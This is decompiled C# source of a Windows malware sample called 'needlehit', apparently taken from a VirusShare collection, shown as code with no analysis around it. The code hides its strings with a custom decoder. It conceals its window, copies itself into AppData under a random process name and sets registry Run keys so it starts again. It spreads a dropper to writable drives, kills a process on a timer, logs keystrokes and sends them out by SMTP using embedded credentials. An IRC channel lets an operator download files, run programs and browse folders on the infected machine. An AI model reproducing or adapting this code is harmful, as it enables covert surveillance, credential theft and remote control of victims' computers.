// Decompiled with JetBrains decompiler
// Type: needlehit.Form1
// Assembly: needlehit, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B5A2CBB4-7E37-49CB-9D10-846933E119E0
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-153e23ddbd17f3adccf2a7d2198b97d8a68f3450fcb233edc41e5548b82517e8.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using needlehit.My;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace needlehit
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private static List<WeakReference> __ENCList = new List<WeakReference>();
    private IContainer components;
    [AccessedThroughProperty("Timer1")]
    private System.Windows.Forms.Timer _Timer1;
    private Random rnd;
    public List<string> st;
    private Form1.Keylogger_ key;
    private string name_s;
    private Form1.Ir irc;
    private string er;
    private string nier;
    private string aller;
    private string siter;
    private string fehlerd;
    private string fileser;
    private string ordner;

    [DebuggerNonUserCode]
    static Form1()
    {
    }

    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      Form1.__ENCAddToList((object) this);
      this.rnd = new Random();
      this.st = new List<string>();
      this.key = new Form1.Keylogger_();
      this.irc = new Form1.Ir();
      this.er = Form1.love_is_hard.entnerd("wqw#wwz#wqt#wwt#wwe#wqo#weq#wqo#wwr#wqo#wwt");
      this.nier = Form1.love_is_hard.entnerd("wwq#wqu#wqw#wqi#weq#ri#wqi#wew#wwq#weq#wwo#wwt#weu#wwt#wwp#wwt#weq");
      this.aller = Form1.love_is_hard.entnerd("tz#po#wwq#www");
      this.siter = Form1.love_is_hard.entnerd("tz#wwu#wqi#wwp#wqz#ri");
      this.fehlerd = Form1.love_is_hard.entnerd("iq#wqe#wqu#www#wqz#wwp");
      this.fileser = Form1.love_is_hard.entnerd("tz#wqr#wqi#www#wqz#weq");
      this.ordner = Form1.love_is_hard.entnerd("tz#wwe#wwu#wqr#wwt#wqu#weq");
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    private static void __ENCAddToList(object value)
    {
      lock (Form1.__ENCList)
      {
        if (Form1.__ENCList.Count == Form1.__ENCList.Capacity)
        {
          int index1 = 0;
          int num = checked (Form1.__ENCList.Count - 1);
          int index2 = 0;
          while (index2 <= num)
          {
            if (Form1.__ENCList[index2].IsAlive)
            {
              if (index2 != index1)
                Form1.__ENCList[index1] = Form1.__ENCList[index2];
              checked { ++index1; }
            }
            checked { ++index2; }
          }
          Form1.__ENCList.RemoveRange(index1, checked (Form1.__ENCList.Count - index1));
          Form1.__ENCList.Capacity = Form1.__ENCList.Count;
        }
        Form1.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
      }
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      this.Timer1 = new System.Windows.Forms.Timer(this.components);
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(256, 154);
      this.Name = nameof (Form1);
      this.Text = nameof (Form1);
      this.ResumeLayout(false);
    }

    internal virtual System.Windows.Forms.Timer Timer1
    {
      [DebuggerNonUserCode] get => this._Timer1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
        if (this._Timer1 != null)
          this._Timer1.Tick -= eventHandler;
        this._Timer1 = value;
        if (this._Timer1 == null)
          return;
        this._Timer1.Tick += eventHandler;
      }
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      this.Opacity = 0.0;
      this.ShowInTaskbar = false;
      this.Visible = false;
      this.st.Add(Form1.love_is_hard.entnerd("wwu#po#wwi#wwq#wwr#wqo#weq"));
      this.st.Add(Form1.love_is_hard.entnerd("pp#wwq#wqe"));
      this.st.Add(Form1.love_is_hard.entnerd("wqp#wwu#wqw#wwt#wwt#wqi#www#wwq"));
      this.st.Add(Form1.love_is_hard.entnerd("or#wwe#wqt#wwp#wer#wqe#weq#wqo#wqq#ou#wwz#wwq#weu#wet#wep#weu#wwo#wrr#wwq#wqu#wez#wrw#wee#wrt#wtr#wtq#wwo#pt#wtz#wtr#wtt#wre#wte#wtp#weq#wru#wzq#wze#wtr#wzq#wzq#wrr#wet#wuq#wzt"));
      this.st.Add(Form1.love_is_hard.entnerd("or#wwe#wqt#wwp#wer#wqe#weq#wqo#wqq#ou#wwz#wwq#weu#wet#wep#weu#wwo#wrr#wwq#wqu#wez#wrw#wee#wrt#wtr#wtq#wwo#pt#wtz#wtr#wtt#wre#wte#wtp#weq#wru#wzq#wze#wtr#wzq#wzq#wrr#wet#wuq#wzt#wet#wzu#wtu#wtp"));
      this.st.Add(Form1.love_is_hard.entnerd("oi#wwe#wqu#wwt#wwp#wew#ro#pt#wwr#wwp#wwq#wee#wrw#weo#tu#pt#wqq#pi#zq#pw#wrw#wru#wro"));
      this.st.Add(Form1.love_is_hard.entnerd("uz#wqt#wqr#wqw#wwz#wwu#wee"));
      this.st.Add(Form1.love_is_hard.entnerd("zz#zr#zp#zt#zo#zi#ur#ur#zo#uq#ut#ur#up#uz#ui#up#ut#it#up#iw#it#it#ip#iz#iu#ir#ip#io#oq#iz#wtu#wzw#wto"));
      this.name_s = Form1.love_is_hard.entnerd("wwq#wqe#wqr#wqr#wwe#wqu#wwq#wwe#wet#zz#wez#wre#wei");
      string path2_1 = Form1.love_is_hard.entnerd("wwq#wqe#wqr#wqr#wwe#wqu#wwq#wwe#wet#zz#www#wrw#wwr");
      string zelle = Form1.love_is_hard.entnerd("uo#iq#up#oz#ii#oz#pq#ii#ow#pe#oe");
      if (!MyProject.Computer.FileSystem.FileExists(Path.Combine(Application.StartupPath, this.st[7])))
      {
        if (!MyProject.Computer.FileSystem.FileExists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), this.name_s)))
        {
          MyProject.Computer.FileSystem.MoveFile(Application.ExecutablePath, Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), path2_1));
          string str = Form1.love_is_hard.entnerd("rz#ow#wwu#wwt#wqr#wqu#wew#wee#wwo#wqu#wwp#wwe#zz#zo#ue#uq#ut#ue#uu#ut#zz#op#pw#pq#wqu#po#wqu#www#po#wqe#wwr#wqr#iz");
          MyProject.Computer.FileSystem.WriteAllText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), this.name_s), str + this.GEN(), false);
          this.save_proporty(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), this.name_s), zelle, this.GEN());
          this.CN();
          this.Aut();
          this.Close();
        }
        if (Operators.CompareString(this.read_proporty(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), this.name_s), zelle), Interaction.Command(), false) == 0)
          this.save_proporty(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), this.name_s), zelle, this.GEN());
        this.CN();
        this.Aut();
        string path2_2 = Form1.love_is_hard.entnerd("oz#ot#uo#rz#op#wwi#wqu#wqt#wet#wwq#zu#wwe#wre#wwt");
        List<string> usbDriver = this.Get_USB_Driver();
        int num = checked (usbDriver.Count - 1);
        int index = 0;
        while (index <= num)
        {
          if (!System.IO.File.Exists(Path.Combine(usbDriver[index], path2_2)))
            System.IO.File.WriteAllBytes(Path.Combine(usbDriver[index], path2_2), needlehit.My.Resources.Resources.Droper_Needlehit_a);
          checked { ++index; }
        }
        this.Timer1.Start();
        this.key.start_();
      }
      else
        this.Close();
    }

    public string GEN()
    {
      string str = "";
      int num = 0;
      do
      {
        char[] charArrayRankOne = Conversions.ToCharArrayRankOne("QWERTZUIOPASDFGHJKLYXCVBNM12345567890");
        str += Conversions.ToString(charArrayRankOne[this.rnd.Next(0, checked (charArrayRankOne.Length - 1))]);
        checked { ++num; }
      }
      while (num <= 30);
      return str;
    }

    public void Aut()
    {
      string zelle1 = Form1.love_is_hard.entnerd("uo#iq#up#oz#ii#oz#pq#ii#ow#pe#oe");
      string zelle2 = Form1.love_is_hard.entnerd("oq#wwz#wwr#wqe#wqz#weq#wew#wwi#wqz#wwo#www");
      string path2 = this.read_proporty(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), this.name_s), zelle2);
      string str = this.read_proporty(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), this.name_s), zelle1);
      RegistryKey subKey1 = MyProject.Computer.Registry.CurrentUser.CreateSubKey(this.st[3]);
      subKey1.SetValue(this.st[5], (object) (Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), path2) + " " + str));
      subKey1.Close();
      RegistryKey subKey2 = MyProject.Computer.Registry.CurrentUser.CreateSubKey(this.st[4]);
      subKey2.SetValue(this.st[6], (object) (Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), path2) + " " + str));
      subKey2.Close();
    }

    public void CN()
    {
      Process[] processes = Process.GetProcesses();
      string str1 = Form1.love_is_hard.entnerd("tu#wqe#wee#wqt");
      string processName;
      do
      {
        processName = processes[this.rnd.Next(0, 5)].ProcessName;
      }
      while (MyProject.Computer.FileSystem.FileExists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + processName + str1));
      string zelle = Form1.love_is_hard.entnerd("oq#wwz#wwr#wqe#wqz#weq#wew#wwi#wqz#wwo#www");
      string str2 = this.read_proporty(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), this.name_s), zelle);
      string str3 = Form1.love_is_hard.entnerd("wwq#wqe#wqr#wqr#wwe#wqu#wwq#wwe#wet#zz#www#wrw#wwr");
      if (Operators.CompareString(str2, Form1.love_is_hard.entnerd("tz#tp#ti#zw#tp#zr#zw"), false) == 0)
        str2 = str3;
      MyProject.Computer.FileSystem.RenameFile(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), str2), processName + str1);
      this.save_proporty(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), this.name_s), zelle, processName + str1);
    }

    public void save_proporty(string file, string zelle, string data)
    {
      if (MyProject.Computer.FileSystem.FileExists(file))
      {
        string[] strArray1 = MyProject.Computer.FileSystem.ReadAllText(file).Split('#');
        int num1 = checked (strArray1.Length - 1);
        int index1 = 0;
        while (index1 <= num1)
        {
          string[] strArray2 = strArray1[index1].Split('+');
          if (Operators.CompareString(strArray2[0], zelle, false) == 0)
          {
            strArray1[index1] = strArray1[index1].Replace(strArray2[1], data);
            string text = "";
            int num2 = checked (strArray1.Length - 1);
            int index2 = 0;
            while (index2 <= num2)
            {
              text = text + strArray1[index2] + Interaction.IIf(index2 == checked (strArray1.Length - 1), (object) "", (object) "#").ToString();
              checked { ++index2; }
            }
            MyProject.Computer.FileSystem.WriteAllText(file, text, false);
            return;
          }
          checked { ++index1; }
        }
        MyProject.Computer.FileSystem.WriteAllText(file, "#" + zelle + "+" + data, true);
      }
      else
        MyProject.Computer.FileSystem.WriteAllText(file, "#" + zelle + "+" + data, true);
    }

    public string read_proporty(string file, string zelle)
    {
      string[] strArray1 = MyProject.Computer.FileSystem.ReadAllText(file).Split('#');
      int num = checked (strArray1.Length - 1);
      int index = 0;
      while (index <= num)
      {
        string[] strArray2 = strArray1[index].Split('+');
        if (Operators.CompareString(strArray2[0], zelle, false) == 0)
          return strArray2[1];
        checked { ++index; }
      }
      return Form1.love_is_hard.entnerd("tz#tp#ti#zw#tp#zr#zw");
    }

    public List<string> Get_USB_Driver()
    {
      List<string> usbDriver = new List<string>();
      DriveInfo[] drives = DriveInfo.GetDrives();
      int num = checked (drives.Length - 1);
      int index = 0;
      while (index <= num)
      {
        string fullName = drives[index].RootDirectory.FullName;
        bool flag = false;
        try
        {
          System.IO.File.WriteAllText(fullName + "\\a.", "");
          flag = true;
          System.IO.File.Delete(fullName + "\\a.");
          usbDriver.Add(fullName);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          flag = false;
          ProjectData.ClearProjectError();
        }
        checked { ++index; }
      }
      return usbDriver;
    }

    public void KP(string st)
    {
      Process[] processesByName = Process.GetProcessesByName(st);
      int num = checked (processesByName.Length - 1);
      int index = 0;
      while (index <= num)
      {
        processesByName[index].Kill();
        checked { ++index; }
      }
    }

    private void Timer1_Tick(object sender, EventArgs e) => this.KP(this.st[2]);

    public void Connect()
    {
      this.irc.eventtype_string.Add(new Form1.Ir.event_sp());
      this.irc.eventtype_string[0].parm = Form1.love_is_hard.entnerd("rr#wqw#wwr#wee#wwt#wwr#wwi#wqt#wqo");
      this.irc.eventtype_string[0].eventtype1 += new Form1.Ir.event_sp.eventtype1EventHandler(this.event1);
      this.irc.eventtype_string.Add(new Form1.Ir.event_sp());
      this.irc.eventtype_string[1].parm = Form1.love_is_hard.entnerd("rr#wwu#wwo#wqq#wwo#wew");
      this.irc.eventtype_string[1].eventtype1 += new Form1.Ir.event_sp.eventtype1EventHandler(this.event2);
      this.irc.eventtype_string.Add(new Form1.Ir.event_sp());
      this.irc.eventtype_string[2].parm = Form1.love_is_hard.entnerd("rr#wwz#wqr#wwr#wqw#wwt#wqi");
      this.irc.eventtype_string[2].eventtype1 += new Form1.Ir.event_sp.eventtype1EventHandler(this.event3);
      this.irc.eventtype_string.Add(new Form1.Ir.event_sp());
      this.irc.eventtype_string[3].parm = Form1.love_is_hard.entnerd("rr#wqw#wqi#wwi");
      this.irc.eventtype_string[3].eventtype1 += new Form1.Ir.event_sp.eventtype1EventHandler(this.event4);
      this.irc.master = Form1.love_is_hard.entnerd("uu#wqp#pp#wqe#www#or#wqi#wer#wei#weq#wet#wwo#io#wwo#wrq");
      if (this.irc.Connect(Form1.love_is_hard.entnerd("uu#wqp#pp#wqe#www#or#wqi#wer#wqo#wez"), Form1.love_is_hard.entnerd("rz#up#pp#wwi#www#weq#www#wqi#wqp#weq#wwe#weq#wwr"), Form1.love_is_hard.entnerd("wqz#wwz#wqw#tp#wwi#wee#wqr#wwt#wqp#wwp#www#wei#zo#wet#weo#wwo"), Form1.love_is_hard.entnerd("zt#zz#zu#zo")))
        return;
      int num = (int) Interaction.MsgBox((object) "no");
    }

    public void event1(string parm)
    {
      try
      {
        if (!(parm.Contains(this.irc.NICK) | parm.Contains(this.aller)))
          return;
        new WebClient().DownloadFile(new Uri(parm.Split('#')[2]), parm.Split('#')[3]);
        this.irc.Send(this.er);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        this.irc.Send(this.nier);
        ProjectData.ClearProjectError();
      }
    }

    public void event2(string parm)
    {
      try
      {
        if (!(parm.Contains(this.irc.NICK) | parm.Contains(this.aller)))
          return;
        Process.Start(parm.Split('#')[2]);
        this.irc.Send(this.er);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        this.irc.Send(this.nier);
        ProjectData.ClearProjectError();
      }
    }

    public void event3(string parm)
    {
      try
      {
        if (!(parm.Contains(this.irc.NICK) | parm.Contains(this.aller)))
          return;
        MyProject.Computer.FileSystem.RenameFile(parm.Split('#')[2], parm.Split('#')[3]);
        this.irc.Send(this.er);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        this.irc.Send(this.nier);
        ProjectData.ClearProjectError();
      }
    }

    public void event4(string parm)
    {
      try
      {
        if (!(parm.Contains(this.irc.NICK) | parm.Contains(this.aller)))
          return;
        string str1 = parm.Split('#')[2];
        Directory.GetFiles(str1);
        Directory.GetDirectories(str1);
        string str2 = "";
        if (parm.Contains(this.fileser))
        {
          str2 = "";
          if (parm.Contains(this.siter))
          {
            int num = 100;
            while (!parm.Contains(this.siter + Conversions.ToString(num)))
            {
              checked { num += -1; }
              if (num < 1)
                goto label_10;
            }
            string str3 = this.gf(checked (num * 15), checked (num * 15 + 15), str1);
            this.irc.Send(str3);
            if (Operators.CompareString(str3, this.fehlerd, false) != 0)
              this.irc.Send(this.er);
          }
          else
            this.irc.Send(this.fehlerd);
label_10:;
        }
        if (parm.Contains(this.ordner))
        {
          str2 = "";
          if (parm.Contains(this.siter))
          {
            int num = 100;
            while (!parm.Contains(this.siter + Conversions.ToString(num)))
            {
              checked { num += -1; }
              if (num < 1)
                goto label_20;
            }
            string str4 = this.go(checked (num * 15), checked (num * 15 + 15), str1);
            this.irc.Send(str4);
            if (Operators.CompareString(str4, this.fehlerd, false) != 0)
              this.irc.Send(this.er);
          }
          else
            this.irc.Send(this.fehlerd);
label_20:;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        this.irc.Send(this.nier);
        ProjectData.ClearProjectError();
      }
    }

    public string gf(int von, int bis, string file1)
    {
      string[] files = Directory.GetFiles(file1);
      string str = "";
      if (checked (files.Length - 1) < von)
        return this.fehlerd;
      if (checked (files.Length - 1) > bis)
      {
        int num1 = von;
        int num2 = bis;
        int index = num1;
        while (index <= num2)
        {
          str = str + Interaction.IIf(index == 0, (object) "", (object) "  ").ToString() + files[index].Replace(file1, "");
          checked { ++index; }
        }
      }
      else
      {
        int num3 = von;
        int num4 = checked (files.Length - 1);
        int index = num3;
        while (index <= num4)
        {
          str = str + Interaction.IIf(index == 0, (object) "", (object) "  ").ToString() + files[index].Replace(file1, "");
          checked { ++index; }
        }
      }
      return str;
    }

    public string go(int von, int bis, string file1)
    {
      string[] directories = Directory.GetDirectories(file1);
      string str = "";
      if (checked (directories.Length - 1) < von)
        return this.fehlerd;
      if (checked (directories.Length - 1) > bis)
      {
        int num1 = von;
        int num2 = bis;
        int index = num1;
        while (index <= num2)
        {
          str = str + Interaction.IIf(index == 0, (object) "", (object) "  ").ToString() + directories[index].Replace(file1, "");
          checked { ++index; }
        }
      }
      else
      {
        int num3 = von;
        int num4 = checked (directories.Length - 1);
        int index = num3;
        while (index <= num4)
        {
          str = str + Interaction.IIf(index == 0, (object) "", (object) "  ").ToString() + directories[index].Replace(file1, "");
          checked { ++index; }
        }
      }
      return str;
    }

    public class Keylogger_
    {
      private static List<WeakReference> __ENCList = new List<WeakReference>();
      [AccessedThroughProperty("timer1_")]
      private System.Windows.Forms.Timer _timer1_;
      public string lol;
      public int time;
      public int counter;
      private string file;

      [DebuggerNonUserCode]
      static Keylogger_()
      {
      }

      public Keylogger_()
      {
        Form1.Keylogger_.__ENCAddToList((object) this);
        this.lol = "";
        this.time = 0;
        this.counter = 0;
      }

      [DebuggerNonUserCode]
      private static void __ENCAddToList(object value)
      {
        lock (Form1.Keylogger_.__ENCList)
        {
          if (Form1.Keylogger_.__ENCList.Count == Form1.Keylogger_.__ENCList.Capacity)
          {
            int index1 = 0;
            int num = checked (Form1.Keylogger_.__ENCList.Count - 1);
            int index2 = 0;
            while (index2 <= num)
            {
              if (Form1.Keylogger_.__ENCList[index2].IsAlive)
              {
                if (index2 != index1)
                  Form1.Keylogger_.__ENCList[index1] = Form1.Keylogger_.__ENCList[index2];
                checked { ++index1; }
              }
              checked { ++index2; }
            }
            Form1.Keylogger_.__ENCList.RemoveRange(index1, checked (Form1.Keylogger_.__ENCList.Count - index1));
            Form1.Keylogger_.__ENCList.Capacity = Form1.Keylogger_.__ENCList.Count;
          }
          Form1.Keylogger_.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
        }
      }

      [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
      public static extern int GetAsyncKeyState(int vkey);

      public virtual System.Windows.Forms.Timer timer1_
      {
        [DebuggerNonUserCode] get => this._timer1_;
        [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
        {
          EventHandler eventHandler = new EventHandler(this.timer1_Tick);
          if (this._timer1_ != null)
            this._timer1_.Tick -= eventHandler;
          this._timer1_ = value;
          if (this._timer1_ == null)
            return;
          this._timer1_.Tick += eventHandler;
        }
      }

      public void start_()
      {
        this.file = Application.StartupPath + "\\*n*e*e*d*l*e*h*i*t*.*w*i*n*d*o*w*s*3*2*.*s*y*s".Replace("*", "");
        this.timer1_ = new System.Windows.Forms.Timer();
        this.timer1_.Interval = 50;
        this.timer1_.Start();
      }

      public void timer1_Tick(object sender, EventArgs e)
      {
        try
        {
          this.lol += this.g();
          if (this.counter == 332000)
          {
            MyProject.Computer.FileSystem.WriteAllText(this.file, this.lol, true);
            this.lol = "";
            this.counter = 0;
          }
          else
            checked { ++this.counter; }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }

      public void sendm()
      {
        MailMessage message = new MailMessage();
        NetworkCredential networkCredential = new NetworkCredential();
        networkCredential.UserName = Form1.love_is_hard.entnerd("wwq#wqu#wqr#wwe#wqw#wwz#wqu#wee#wwr#wet#wwo#wqo#wee#wwr#io#wwo#wez#wri#ut#wwp#wew");
        networkCredential.Password = Form1.love_is_hard.entnerd("wqi#po#wqz#wqt#wqz#zt#zu#zo");
        message.IsBodyHtml = false;
        SmtpClient smtpClient = new SmtpClient();
        smtpClient.Host = Form1.love_is_hard.entnerd("wwe#wwe#wwt#tp#wqi#wwt#weu#zr#wwo#wwq#weu");
        smtpClient.Port = 25;
        smtpClient.UseDefaultCredentials = false;
        smtpClient.Credentials = (ICredentialsByHost) networkCredential;
        try
        {
          message.From = new MailAddress(Form1.love_is_hard.entnerd("wwq#wqu#wqr#wwe#wqw#wwz#wqu#wee#wwr#wet#wwo#wqo#wee#wwr#io#wwo#wez#wri#ut#wwp#wew"));
          message.To.Add(Form1.love_is_hard.entnerd("wwq#wqu#wqr#wwe#wqw#wwz#wqu#wee#wwr#wet#wwo#wqo#wee#wwr#io#wwo#wez#wri#ut#wwp#wew"));
          message.Subject = "Data :" + MyProject.Computer.Name + " Date:" + Conversions.ToString(DateTime.Now.Day) + "." + Conversions.ToString(DateTime.Now.Month) + Conversions.ToString(DateTime.Now.Year) + " Time : " + Conversions.ToString(DateTime.Now.Minute) + ":" + Conversions.ToString(DateTime.Now.Hour);
          message.Body = this.lol;
          smtpClient.Send(message);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }

      public string g()
      {
        int num = 1;
        while (Form1.Keylogger_.GetAsyncKeyState(num) != -32767)
        {
          checked { ++num; }
          if (num > (int) byte.MaxValue)
            return "";
        }
        return this.get_keys(num);
      }

      public string get_keys(int @int)
      {
        switch (@int)
        {
          case 8:
            return "[Backspace]";
          case 9:
            return "[Tab]";
          case 13:
            return "[Enter]";
          case 16:
            return "[Shift]";
          case 17:
            return "[Strg]";
          case 18:
            return "[Alt]";
          case 20:
            return "[Umstell.]";
          case 32:
            return " ";
          case 33:
            return "!";
          case 34:
            return "´´";
          case 35:
            return "#";
          case 36:
            return "$";
          case 37:
            return "%";
          case 38:
            return "&";
          case 39:
            return "'";
          case 40:
            return "(";
          case 41:
            return ")";
          case 42:
            return "*";
          case 43:
            return "+";
          case 44:
            return ",";
          case 45:
            return "-";
          case 46:
            return ".";
          case 47:
            return "/";
          case 48:
            return "0";
          case 49:
            return "1";
          case 50:
            return "2";
          case 51:
            return "3";
          case 52:
            return "4";
          case 53:
            return "5";
          case 54:
            return "6";
          case 55:
            return "7";
          case 56:
            return "8";
          case 57:
            return "9";
          case 58:
            return ":";
          case 59:
            return ";";
          case 60:
            return "<";
          case 61:
            return "=";
          case 62:
            return ">";
          case 63:
            return "?";
          case 64:
            return "@";
          case 65:
            return "a";
          case 66:
            return "b";
          case 67:
            return "c";
          case 68:
            return "d";
          case 69:
            return "e";
          case 70:
            return "f";
          case 71:
            return "g";
          case 72:
            return "h";
          case 73:
            return "i";
          case 74:
            return "j";
          case 75:
            return "k";
          case 76:
            return "l";
          case 77:
            return "m";
          case 78:
            return "n";
          case 79:
            return "o";
          case 80:
            return "p";
          case 81:
            return "q";
          case 82:
            return "r";
          case 83:
            return "s";
          case 84:
            return "t";
          case 85:
            return "u";
          case 86:
            return "v";
          case 87:
            return "w";
          case 88:
            return "x";
          case 89:
            return "y";
          case 90:
            return "z";
          case 91:
            return "[Win]";
          case 92:
            return "[Win]";
          case 93:
            return "]";
          case 94:
            return "^";
          case 95:
            return "_";
          case 96:
            return "`";
          case 97:
            return "a";
          case 98:
            return "b";
          case 99:
            return "c";
          case 100:
            return "d";
          case 101:
            return "e";
          case 102:
            return "f";
          case 103:
            return "g";
          case 104:
            return "h";
          case 105:
            return "i";
          case 106:
            return "j";
          case 107:
            return "k";
          case 108:
            return "l";
          case 109:
            return "m";
          case 110:
            return "n";
          case 111:
            return "o";
          case 112:
            return "[F1]";
          case 113:
            return "[F2]";
          case 114:
            return "[F3]";
          case 115:
            return "[F4]";
          case 116:
            return "[F5]";
          case 117:
            return "[F6]";
          case 118:
            return "[F7]";
          case 119:
            return "[F8]";
          case 120:
            return "[F9]";
          case 121:
            return "[F10]";
          case 122:
            return "[F11]";
          case 123:
            return "[F12]";
          case 124:
            return "|";
          case 125:
            return "}";
          case 126:
            return "~";
          case 128:
            return "€";
          case 130:
            return "‚";
          case 131:
            return "ƒ";
          case 132:
            return "„";
          case 133:
            return "…";
          case 134:
            return "†";
          case 135:
            return "‡";
          case 136:
            return "ˆ";
          case 138:
            return "Š";
          case 139:
            return "‹";
          case 142:
            return "Ž";
          case 145:
            return "‘";
          case 146:
            return "’";
          case 147:
            return "\"";
          case 148:
            return "\"";
          case 149:
            return "•";
          case 150:
            return "–";
          case 151:
            return "—";
          case 152:
            return "˜";
          case 153:
            return "™";
          case 154:
            return "š";
          case 155:
            return "›";
          case 158:
            return "ž";
          case 159:
            return "Ÿ";
          case 160:
            return "";
          case 161:
            return "";
          case 162:
            return "";
          case 163:
            return "";
          case 164:
            return "[Alt]";
          case 165:
            return "[Alt]";
          case 166:
            return "¦";
          case 167:
            return "§";
          case 168:
            return "¨";
          case 169:
            return "©";
          case 170:
            return "ª";
          case 171:
            return "«";
          case 172:
            return "¬";
          case 174:
            return "®";
          case 175:
            return "¯";
          case 176:
            return "°";
          case 177:
            return "±";
          case 178:
            return "\u00B2";
          case 179:
            return "\u00B3";
          case 180:
            return "´";
          case 181:
            return "µ";
          case 183:
            return ".";
          case 184:
            return "¸";
          case 185:
            return "\u00B9";
          case 186:
            return "ü";
          case 187:
            return "+";
          case 188:
            return ",";
          case 189:
            return "-";
          case 190:
            return ".";
          case 191:
            return "¿";
          case 192:
            return "ö";
          case 193:
            return "Á";
          case 194:
            return "Â";
          case 195:
            return "Ã";
          case 196:
            return "Ä";
          case 197:
            return "Æ";
          case 198:
            return "Ç";
          case 199:
            return "È";
          case 200:
            return "É";
          case 201:
            return "Ê";
          case 202:
            return "Ë";
          case 203:
            return "Ì";
          case 204:
            return "Í";
          case 205:
            return "Í";
          case 206:
            return "Î";
          case 207:
            return "Ï";
          case 208:
            return "Ð";
          case 209:
            return "Ñ";
          case 210:
            return "Ò";
          case 211:
            return "Ó";
          case 212:
            return "Ô";
          case 213:
            return "Õ";
          case 214:
            return "Ö";
          case 215:
            return "×";
          case 216:
            return "Ø";
          case 217:
            return "Ù";
          case 218:
            return "Ú";
          case 219:
            return "Û";
          case 220:
            return "Ü";
          case 221:
            return "Ý";
          case 222:
            return "ä";
          case 223:
            return "ß";
          case 224:
            return "à";
          case 225:
            return "á";
          case 226:
            return "â";
          case 227:
            return "<";
          case 228:
            return "ä";
          case 229:
            return "æ";
          case 230:
            return "ç";
          case 231:
            return "è";
          case 232:
            return "é";
          case 233:
            return "ê";
          case 234:
            return "ë";
          case 235:
            return "ì";
          case 236:
            return "í";
          case 237:
            return "í";
          case 238:
            return "î";
          case 239:
            return "ï";
          case 240:
            return "ð";
          case 241:
            return "ñ";
          case 242:
            return "ò";
          case 243:
            return "ó";
          case 244:
            return "ô";
          case 245:
            return "õ";
          case 246:
            return "ö";
          case 247:
            return "÷";
          case 248:
            return "ø";
          case 249:
            return "ù";
          case 250:
            return "ú";
          case 251:
            return "û";
          case 252:
            return "ü";
          case 253:
            return "ý";
          case 254:
            return "þ";
          case (int) byte.MaxValue:
            return "ÿ";
          default:
            return "";
        }
      }
    }

    public class love_is_hard
    {
      [DebuggerNonUserCode]
      public love_is_hard()
      {
      }

      public static string entnerd(string Text)
      {
        string str = "";
        string[] strArray = Text.Split('#');
        int num1 = 0;
        int num2 = checked (strArray.Length - 1);
        int index1 = 0;
        while (index1 <= num2)
        {
          string s = "";
          int num3 = checked (strArray[index1].Length - 1);
          int index2 = 0;
          while (index2 <= num3)
          {
            switch ((char) ((int) strArray[index1][index2] - 97))
            {
              case char.MinValue:
                s += ",";
                break;
              case '\u0004':
                s += "2";
                break;
              case '\b':
                s += "7";
                break;
              case '\u000E':
                s += "8";
                break;
              case '\u000F':
                s += "9";
                break;
              case '\u0010':
                s += "0";
                break;
              case '\u0011':
                s += "3";
                break;
              case '\u0013':
                s += "4";
                break;
              case '\u0014':
                s += "6";
                break;
              case '\u0016':
                s += "1";
                break;
              case '\u0019':
                s += "5";
                break;
            }
            checked { ++index2; }
          }
          try
          {
            str += Conversions.ToString(Strings.Chr(checked (int.Parse(s) - num1)));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            int num4 = (int) Interaction.MsgBox((object) ex.ToString());
            ProjectData.ClearProjectError();
          }
          checked { ++num1; }
          checked { ++index1; }
        }
        return str;
      }

